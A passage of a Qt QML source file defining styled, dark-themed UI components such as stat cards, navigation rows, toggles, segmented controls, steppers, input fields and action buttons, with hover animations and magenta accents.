        }

        HoverHandler {
            id: cardHover
            enabled: card.collapsible
            cursorShape: Qt.PointingHandCursor
        }
        TapHandler {
            enabled: card.collapsible
            onTapped: card.open = !card.open
        }
    }

    component StatCard : Rectangle {
        id: stat
        property string label: ""
        property string value: ""
        property string sub: ""
        property color accent: "#d946ef"
        property real progress: -1

        Layout.fillWidth: true
        implicitHeight: 104
        radius: 12

        gradient: Gradient {
            GradientStop { position: 0.0; color: statHover.hovered ? "#121212" : "#0f0f0f" }
            GradientStop { position: 1.0; color: "#0a0a0a" }
        }
        border.width: 1
        border.color: statHover.hovered ? "#242424" : "#1a1a1a"
        Behavior on border.color { ColorAnimation { duration: 140 } }

        // accent strip at the top, fading out
        Rectangle {
            anchors.left: parent.left
            anchors.right: parent.right
            anchors.top: parent.top
            anchors.leftMargin: 1
            anchors.rightMargin: 1
            anchors.topMargin: 1
            height: 2
            radius: parent.radius
            gradient: Gradient {
                orientation: Gradient.Horizontal
                GradientStop { position: 0.0; color: Qt.rgba(stat.accent.r, stat.accent.g, stat.accent.b, 0.85) }
                GradientStop { position: 1.0; color: "#00000000" }
            }
        }

        ColumnLayout {
            anchors.fill: parent
            anchors.margins: 15
            spacing: 3

            RowLayout {
                Layout.fillWidth: true
                spacing: 6
                Rectangle {
                    implicitWidth: 6
                    implicitHeight: 6
                    radius: 3
                    color: stat.accent
                }
                Label {
                    Layout.fillWidth: true
                    text: stat.label
                    color: "#6b7280"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 9
                    font.letterSpacing: 1.4
                    font.capitalization: Font.AllUppercase
                    elide: Text.ElideRight
                }
            }
            Label {
                text: stat.value
                color: stat.accent
                font.family: "JetBrains Mono"
                font.pixelSize: 26
                font.bold: true
            }
            Label {
                Layout.fillWidth: true
                Layout.minimumWidth: 0
                text: stat.sub
                color: "#6b7280"
                font.family: "JetBrains Mono"
                font.pixelSize: 10
                elide: Text.ElideRight
            }
            Item { Layout.fillHeight: true }
            Rectangle {
                Layout.fillWidth: true
                implicitHeight: 3
                radius: 2
                color: "#1a1a1a"
                visible: stat.progress >= 0
                Rectangle {
                    height: parent.height
                    radius: 2
                    color: stat.accent
                    width: parent.width * Math.max(0, Math.min(1, stat.progress))
                    Behavior on width { NumberAnimation { duration: 180 } }
                }
            }
        }

        HoverHandler { id: statHover }
    }

    component MiniStat : Rectangle {
        property string label: ""
        property string value: "—"
        property color tone: "#d1d5db"

        Layout.fillWidth: true
        implicitHeight: 50
        radius: 9
        color: "#0a0a0a"
        border.width: 1
        border.color: "#1a1a1a"

        ColumnLayout {
            anchors.fill: parent
            anchors.margins: 11
            spacing: 1
            Label {
                text: parent.parent.label
                color: "#4b4b53"
                font.family: "JetBrains Mono"
                font.pixelSize: 9
                font.letterSpacing: 1.2
                font.capitalization: Font.AllUppercase
                elide: Text.ElideRight
            }
            Label {
                Layout.fillWidth: true
                Layout.minimumWidth: 0
                text: parent.parent.value
                color: parent.parent.tone
                font.family: "JetBrains Mono"
                font.pixelSize: 14
                font.bold: true
                elide: Text.ElideRight
            }
        }
    }

    component KeyValue : RowLayout {
        property string label: ""
        property string value: ""
        property color tone: "#d1d5db"

        Layout.fillWidth: true
        spacing: 8

        Label {
            text: parent.label
            color: "#6b7280"
            font.family: "JetBrains Mono"
            font.pixelSize: 10
        }
        Rectangle {
            Layout.fillWidth: true
            implicitHeight: 1
            color: "#161616"
        }
        Label {
            Layout.minimumWidth: 0
            text: parent.value
            color: parent.tone
            font.family: "JetBrains Mono"
            font.pixelSize: 10
            horizontalAlignment: Text.AlignRight
            elide: Text.ElideRight
        }
    }

    component MetaRow : RowLayout {
        property string label: ""
        property string value: ""
        property color tone: "#6b7280"

        Layout.fillWidth: true
        spacing: 8

        Label {
            text: parent.label
            color: "#4b4b53"
            font.family: "JetBrains Mono"
            font.pixelSize: 9
            font.capitalization: Font.AllUppercase
            font.letterSpacing: 1
        }
        Label {
            Layout.fillWidth: true
            Layout.minimumWidth: 0
            text: parent.value
            color: parent.tone
            font.family: "JetBrains Mono"
            font.pixelSize: 9
            horizontalAlignment: Text.AlignRight
            elide: Text.ElideRight
        }
    }

    component Chip : Rectangle {
        id: chip
        property string label: ""
        property bool on: true
        property color accent: "#d946ef"

        implicitWidth: chipLabel.implicitWidth + 30
        implicitHeight: 26
        radius: 8
        color: chip.on ? Qt.rgba(chip.accent.r, chip.accent.g, chip.accent.b, 0.12) : "#0f0f0f"
        border.width: 1
        border.color: chip.on ? Qt.rgba(chip.accent.r, chip.accent.g, chip.accent.b, 0.40) : "#1a1a1a"

        RowLayout {
            anchors.centerIn: parent
            spacing: 7
            Rectangle {
                implicitWidth: 6
                implicitHeight: 6
                radius: 3
                color: chip.on ? chip.accent : "#3f3f46"
            }
            Label {
                id: chipLabel
                text: chip.label
                color: chip.on ? "#f0abfc" : "#4b4b53"
                font.family: "JetBrains Mono"
                font.pixelSize: 10
            }
        }
    }

    component NavRow : Rectangle {
        id: nav
        property string code: ""
        property string title: ""
        property bool active: false
        signal picked()

        Layout.fillWidth: true
        implicitHeight: 38
        radius: 9
        color: nav.active ? Qt.rgba(0.851, 0.275, 0.937, 0.12)
                          : (hov.hovered ? "#131313" : "transparent")
        Behavior on color { ColorAnimation { duration: 130 } }

        // left accent bar
        Rectangle {
            anchors.left: parent.left
            anchors.verticalCenter: parent.verticalCenter
            anchors.leftMargin: 1
            width: 3
            height: 18
            radius: 2
            color: "#d946ef"
            opacity: nav.active ? 1 : 0
            Behavior on opacity { NumberAnimation { duration: 140 } }
        }

        RowLayout {
            anchors.fill: parent
            anchors.leftMargin: 13
            anchors.rightMargin: 12
            spacing: 11

            Rectangle {
                Layout.alignment: Qt.AlignVCenter
                implicitWidth: 22
                implicitHeight: 22
                radius: 6
                color: nav.active ? Qt.rgba(0.851, 0.275, 0.937, 0.18) : "#101010"
                border.width: 1
                border.color: nav.active ? Qt.rgba(0.851, 0.275, 0.937, 0.45) : "#1c1c1c"
                Label {
                    anchors.centerIn: parent
                    text: nav.code
                    color: nav.active ? "#e879f9" : "#52525b"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 9
                    font.bold: nav.active
                }
            }
            Label {
                Layout.fillWidth: true
                Layout.minimumWidth: 0
                Layout.preferredWidth: 0
                text: nav.title
                color: nav.active ? "#e879f9" : hov.hovered ? "#d1d5db" : "#8b8b93"
                font.family: "JetBrains Mono"
                font.pixelSize: 11
                font.bold: nav.active
                elide: Text.ElideRight
            }
        }

        HoverHandler {
            id: hov
            cursorShape: Qt.PointingHandCursor
        }
        TapHandler { onTapped: nav.picked() }
    }

    component ToggleRow : Rectangle {
        id: row
        property string title: ""
        property string sub: ""
        property bool on: false
        signal toggled(bool state)

        Layout.fillWidth: true
        implicitHeight: 54
        radius: 10
        color: row.on ? Qt.rgba(0.851, 0.275, 0.937, 0.05)
                      : (hov.hovered ? "#111111" : "#0c0c0c")
        border.width: 1
        border.color: row.on ? Qt.rgba(0.851, 0.275, 0.937, 0.22)
                             : (hov.hovered ? "#202020" : "#151515")
        Behavior on color { ColorAnimation { duration: 140 } }
        Behavior on border.color { ColorAnimation { duration: 140 } }

        RowLayout {
            anchors.fill: parent
            anchors.leftMargin: 13
            anchors.rightMargin: 14
            spacing: 13

            // switch
            Rectangle {
                Layout.alignment: Qt.AlignVCenter
                implicitWidth: 40
                implicitHeight: 22
                radius: 11
                color: row.on ? "#d946ef" : "#161616"
                border.width: row.on ? 0 : 1
                border.color: "#2a2a2a"
                Behavior on color { ColorAnimation { duration: 130 } }

                Rectangle {
                    width: 16
                    height: 16
                    radius: 8
                    y: 3
                    x: row.on ? parent.width - width - 3 : 3
                    color: row.on ? "#050505" : "#6b7280"
                    Behavior on x { NumberAnimation { duration: 150; easing.type: Easing.OutCubic } }
                    Behavior on color { ColorAnimation { duration: 130 } }
                }
            }

            ColumnLayout {
                Layout.fillWidth: true
                spacing: 1

                Label {
                    Layout.fillWidth: true
                    Layout.minimumWidth: 0
                    Layout.preferredWidth: 0
                    text: row.title
                    color: row.on ? "#e5e7eb" : "#71717a"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 12
                    elide: Text.ElideRight
                }
                Label {
                    Layout.fillWidth: true
                    Layout.minimumWidth: 0
                    Layout.preferredWidth: 0
                    visible: row.sub !== ""
                    text: row.sub
                    color: "#4b4b53"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                    elide: Text.ElideRight
                }
            }
        }

        HoverHandler { id: hov; cursorShape: Qt.PointingHandCursor }
        TapHandler { onTapped: row.toggled(!row.on) }
    }

    component OptionCard : Rectangle {
        id: opt
        property string label: ""
        property string sub: ""
        property bool selected: false
        signal picked()

        Layout.fillWidth: true
        implicitHeight: 54
        radius: 10
        color: opt.selected ? Qt.rgba(0.851, 0.275, 0.937, 0.10)
                            : (hov.hovered ? "#111111" : "#0c0c0c")
        border.width: 1
        border.color: opt.selected ? Qt.rgba(0.851, 0.275, 0.937, 0.55)
                                   : (hov.hovered ? "#202020" : "#151515")
        Behavior on border.color { ColorAnimation { duration: 140 } }

        RowLayout {
            anchors.fill: parent
            anchors.leftMargin: 13
            anchors.rightMargin: 13
            spacing: 11

            Rectangle {
                id: radio
                Layout.alignment: Qt.AlignVCenter
                implicitWidth: 16
                implicitHeight: 16
                radius: 8
                color: "transparent"
                border.width: 1
                border.color: opt.selected ? "#d946ef" : "#2a2a2a"

                Rectangle {
                    anchors.centerIn: parent
                    width: 6
                    height: 6
                    radius: 3
                    color: "#d946ef"
                    visible: opt.selected
                }
            }

            ColumnLayout {
                Layout.fillWidth: true
                spacing: 1

                Label {
                    Layout.fillWidth: true
                    Layout.minimumWidth: 0
                    Layout.preferredWidth: 0
                    text: opt.label
                    color: opt.selected ? "#f0abfc" : "#d1d5db"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 12
                    font.bold: opt.selected
                    elide: Text.ElideRight
                }
                Label {
                    Layout.fillWidth: true
                    Layout.minimumWidth: 0
                    Layout.preferredWidth: 0
                    text: opt.sub
                    color: "#4b4b53"
                    font.family: "JetBrains Mono"
                    font.pixelSize: 10
                    elide: Text.ElideRight
                }
            }
        }

        HoverHandler { id: hov; cursorShape: Qt.PointingHandCursor }
        TapHandler { onTapped: opt.picked() }
    }

    component Segmented : Rectangle {
        id: seg
        property var options: []
        property int current: 0
        signal picked(int index)

        Layout.minimumWidth: 0
        implicitHeight: 38
        implicitWidth: segRow.implicitWidth + 8
        radius: 9
        color: "#080808"
        border.width: 1
        border.color: "#1a1a1a"

        RowLayout {
            id: segRow
            anchors.fill: parent
            anchors.margins: 3
            spacing: 3

            Repeater {
                model: seg.options

                delegate: Rectangle {
                    Layout.fillHeight: true
                    Layout.fillWidth: true
                    Layout.minimumWidth: 0
                    implicitWidth: segLabel.implicitWidth + 26
                    radius: 6
                    color: index === seg.current ? Qt.rgba(0.851, 0.275, 0.937, 0.20)
                                                 : (hov2.hovered ? "#141414" : "transparent")
                    border.width: index === seg.current ? 1 : 0
                    border.color: Qt.rgba(0.851, 0.275, 0.937, 0.5)
                    Behavior on color { ColorAnimation { duration: 130 } }

                    Label {
                        id: segLabel
                        anchors.left: parent.left
                        anchors.right: parent.right
                        anchors.verticalCenter: parent.verticalCenter
                        anchors.leftMargin: 8
                        anchors.rightMargin: 8
                        text: modelData
                        color: index === seg.current ? "#f0abfc" : "#6b7280"
                        font.family: "JetBrains Mono"
                        font.pixelSize: 11
                        font.bold: index === seg.current
                        horizontalAlignment: Text.AlignHCenter
                        elide: Text.ElideRight
                    }

                    HoverHandler { id: hov2; cursorShape: Qt.PointingHandCursor }
                    TapHandler { onTapped: seg.picked(index) }
                }
            }
        }
    }

    component StepBtn : Rectangle {
        id: stepBtn
        property string glyph: ""
        property bool enabledStep: true
        signal hit()

        Layout.fillHeight: true
        implicitWidth: 30
        radius: 6
        color: sbHover.hovered && stepBtn.enabledStep ? "#1a1a1a" : "transparent"

        Label {
            anchors.centerIn: parent
            text: stepBtn.glyph
            color: stepBtn.enabledStep ? "#d1d5db" : "#3f3f46"
            font.family: "JetBrains Mono"
            font.pixelSize: 14
            font.bold: true
        }

        HoverHandler { id: sbHover; cursorShape: Qt.PointingHandCursor }
        TapHandler { enabled: stepBtn.enabledStep; onTapped: stepBtn.hit() }
    }

    component Stepper : Rectangle {
        id: step
        property int value: 0
        property int from: 0
        property int to: 100
        property string suffix: ""
        signal stepped(int v)

        implicitWidth: 150
        implicitHeight: 36
        radius: 9
        color: "#080808"
        border.width: 1
        border.color: "#1a1a1a"

        RowLayout {
            anchors.fill: parent
            anchors.margins: 3
            spacing: 3

            StepBtn {
                glyph: "−"
                enabledStep: step.value > step.from
                onHit: { step.value -= 1; step.stepped(step.value) }
            }

            Label {
                Layout.fillWidth: true
                text: step.value + step.suffix
                color: "#d1d5db"
                font.family: "JetBrains Mono"
                font.pixelSize: 12
                font.bold: true
                horizontalAlignment: Text.AlignHCenter
            }

            StepBtn {
                glyph: "+"
                enabledStep: step.value < step.to
                onHit: { step.value += 1; step.stepped(step.value) }
            }
        }
    }

    component FieldLabel : Label {
        color: "#4b4b53"
        font.family: "JetBrains Mono"
        font.pixelSize: 9
        font.letterSpacing: 1.4
        font.capitalization: Font.AllUppercase
    }

    component InputBox : TextField {
        id: input
        property string value: ""
        property alias placeholder: input.placeholderText
        signal edited(string text)

        implicitHeight: 36
        text: value
        leftPadding: 11
        rightPadding: 11
        color: "#d1d5db"
        placeholderTextColor: "#3f3f46"
        selectionColor: Qt.rgba(0.851, 0.275, 0.937, 0.35)
        selectedTextColor: "#f0abfc"
        font.family: "JetBrains Mono"
        font.pixelSize: 11
        onTextChanged: input.edited(text)
        background: Rectangle {
            color: "#080808"
            radius: 9
            border.width: 1
            border.color: input.activeFocus ? Qt.rgba(0.851, 0.275, 0.937, 0.55) : "#1a1a1a"
            Behavior on border.color { ColorAnimation { duration: 120 } }
        }
    }

    component InputArea : TextArea {
        id: area
        property string value: ""
        signal edited(string text)

        text: value
        leftPadding: 11
        rightPadding: 11
        topPadding: 9
        bottomPadding: 9
        color: "#d1d5db"
        selectionColor: Qt.rgba(0.851, 0.275, 0.937, 0.35)
        selectedTextColor: "#f0abfc"
        font.family: "JetBrains Mono"
        font.pixelSize: 11
        wrapMode: TextArea.Wrap
        onTextChanged: area.edited(text)
        background: Rectangle {
            color: "#080808"
            radius: 9
            border.width: 1
            border.color: area.activeFocus ? Qt.rgba(0.851, 0.275, 0.937, 0.55) : "#1a1a1a"
            Behavior on border.color { ColorAnimation { duration: 120 } }
        }
    }

    component ActionButton : Rectangle {
        id: btn
        property string label: ""
        property color fill: "#d946ef"
        property color fg: "#050505"
        signal clicked()

        implicitWidth: btnLabel.implicitWidth + 48
        implicitHeight: 36
        radius: 9
        color: btn.enabled ? (bh.hovered ? Qt.lighter(btn.fill, 1.14) : btn.fill) : "#141414"
        opacity: btn.enabled ? 1 : 0.6
        Behavior on color { ColorAnimation { duration: 120 } }

        // subtle top sheen
        Rectangle {
            visible: btn.enabled && btn.fill !== "#141414"
            anchors.left: parent.left
            anchors.right: parent.right
            anchors.top: parent.top
            anchors.margins: 1
            height: 1
            radius: parent.radius
            color: Qt.rgba(1, 1, 1, 0.28)
        }

        Label {
            id: btnLabel
            anchors.centerIn: parent
            text: btn.label
            color: btn.fg
            font.family: "JetBrains Mono"
            font.pixelSize: 11
            font.bold: true
            font.letterSpacing: 1
            font.capitalization: Font.AllUppercase
        }

        HoverHandler { id: bh; cursorShape: Qt.PointingHandCursor }
        TapHandler { enabled: btn.enabled; onTapped: btn.clicked() }
    }

    component Note : Rectangle {
        property string text: ""
        property color tone: "#e879f9"

        Layout.fillWidth: true
        implicitHeight: Math.max(44, noteText.implicitHeight + 26)
        radius: 10
        color: Qt.rgba(tone.r, tone.g, tone.b, 0.06)
        border.width: 1
        border.color: Qt.rgba(tone.r, tone.g, tone.b, 0.22)

        RowLayout {
            anchors.fill: parent
            anchors.leftMargin: 13
            anchors.rightMargin: 13
            spacing: 11

            Rectangle {
                Layout.alignment: Qt.AlignTop
                Layout.topMargin: 7
                implicitWidth: 3
                implicitHeight: 14
                radius: 2
                color: parent.parent.tone
            }
            Label {
                id: noteText
                Layout.fillWidth: true
                Layout.minimumWidth: 0
                Layout.preferredWidth: 0
                Layout.topMargin: 13
                Layout.bottomMargin: 13
                text: parent.parent.text
                color: "#9ca3af"
                font.family: "JetBrains Mono"
                font.pixelSize: 10
                wrapMode: Text.Wrap
                lineHeight: 1.4
            }
        }
    }
}
